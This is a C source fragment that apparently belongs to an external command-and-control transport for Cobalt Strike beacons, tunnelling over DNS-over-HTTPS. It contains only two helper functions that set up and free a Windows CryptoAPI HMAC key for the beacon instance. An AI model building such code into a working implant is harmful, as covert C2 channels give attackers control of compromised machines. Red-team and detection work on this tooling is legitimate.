/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "../common.h"

/*-
 *
 * CryptHmacInit
 *
 * Purpose:
 *
 * Creates the key object for HMAC
 *
-*/
DEFINESEC(B) BOOL CryptHmacInit( PBEACON_INSTANCE Ins )
{
	if ( Ins->api.CryptAcquireContextA( &Ins->key[2].Provider, NULL, 0, PROV_RSA_SCHANNEL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
	{
		if ( Ins->api.CryptImportKey( Ins->key[2].Provider, Ins->key[2].Ptr, Ins->key[2].Len, 0, CRYPT_IPSEC_HMAC_KEY, &Ins->key[2].Key ) )
		{
			return TRUE;
		};
		Ins->api.CryptReleaseContext( Ins->key[2].Provider, 0 );
	};
	return FALSE;
};

/*-
 *
 * CryptHmacFree
 *
 * Purpose:
 *
 * Free's the associated keys for HMAC
 *
-*/
DEFINESEC(B) VOID CryptHmacFree( PBEACON_INSTANCE Ins )
{
	Ins->api.CryptDestroyKey( Ins->key[2].Key );
	Ins->api.CryptReleaseContext( Ins->key[2].Provider, 0 );
};
